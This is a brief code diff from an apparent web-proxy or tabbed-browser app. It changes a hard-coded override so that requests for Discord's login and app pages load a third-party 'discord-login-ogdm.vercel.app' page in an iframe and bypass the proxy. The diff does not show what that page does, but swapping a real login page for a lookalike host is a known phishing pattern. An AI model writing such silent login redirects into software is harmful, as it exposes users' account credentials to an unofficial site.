@@ -110,11 +110,11 @@ function loadPage(url) {
 
   // 🔥 Discord overrides (login + app)
   if (url.includes("discord.com/login") || url.includes("discord.com/app")) {
-    actualURL = "https://discord-login-ogdm";
+    actualURL = "https://discord-login-ogdm.vercel.app";
   }
 
   // Load override directly, otherwise use proxy
-  if (actualURL === "https://discord-login-ogdm") {
+  if (actualURL === "https://discord-login-ogdm.vercel.app") {
     tab.iframe.src = actualURL;
   } else {
     tab.iframe.src = "/api/proxy?url=" + encodeURIComponent(actualURL);
